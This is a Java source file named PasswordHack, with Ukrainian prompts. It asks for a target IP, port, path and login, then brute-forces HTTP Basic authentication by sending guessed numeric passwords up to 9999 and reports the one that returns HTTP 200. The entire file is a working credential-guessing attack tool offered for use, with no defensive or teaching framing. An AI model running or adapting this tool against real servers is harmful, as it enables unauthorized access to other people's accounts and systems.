package com.gmail.alex60070;

import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

import org.apache.commons.codec.binary.Base64;

public class PasswordHack {

    public static void main(String[] args) throws Exception {
        Scanner input = new Scanner(System.in);

        System.out.print("IP: ");
        String ip = input.next();

        System.out.print("Порт: ");
        String port = input.next();

        System.out.print("Шлях: ");
        String path = input.next();

        System.out.print("Логін: ");
        String login = input.next();

        System.out.print("Нижня границя паролю: ");
        int lowerBound = input.nextInt();

        System.out.println("Зачекайте, виконується підбор паролю...");

        URL url = new URL("http://"+ip+":"+port+path);
        int password = lowerBound;

        while (password <= 9999){
           if (hack(login, String.valueOf(password),url))
               break;
            Thread.sleep(50);
            password++;
        }
        if (password > 9999){
            System.out.println("Пароль не знайдено.");
        }
        else {
            System.out.println("Пароль знайдено: "+password);
        }
    }

    private static boolean hack(String login, String password, URL url) {
        try {
            Base64 b = new Base64();
            String encoding = b.encodeAsString(new String(login + ":" + password).getBytes());

            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setDoOutput(true);
            connection.setRequestProperty("Authorization", "Basic " + encoding);

            int responseCode = connection.getResponseCode();
            return responseCode == 200;

        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }
}